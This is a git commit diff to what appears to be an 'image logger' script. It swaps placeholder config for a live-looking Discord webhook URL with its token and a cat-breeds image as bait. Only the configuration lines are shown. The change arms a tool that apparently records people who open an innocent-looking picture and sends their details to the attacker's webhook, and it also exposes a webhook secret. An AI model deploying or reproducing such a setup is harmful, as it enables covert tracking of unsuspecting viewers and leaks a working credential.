1306ba2365b2b8e6fd90f0920d9a14d4c98591a0
Profe55or304s <just.fiko09@gmail.com>
2025-02-08 00:54:02 +0100

    Update image_1728245.py

--- image_1728245.py
+++ image_1728245.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1337571376483008543/knkXG1fciKqSVddhV1Oc6kInHPjVx9HKS02IsGGRLSuFsy39sGxRbPEuxuSAfr0-UDCX",
+    "image": "https://images.litter-robot.com/media/magefan_blog/american-cat-breeds.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
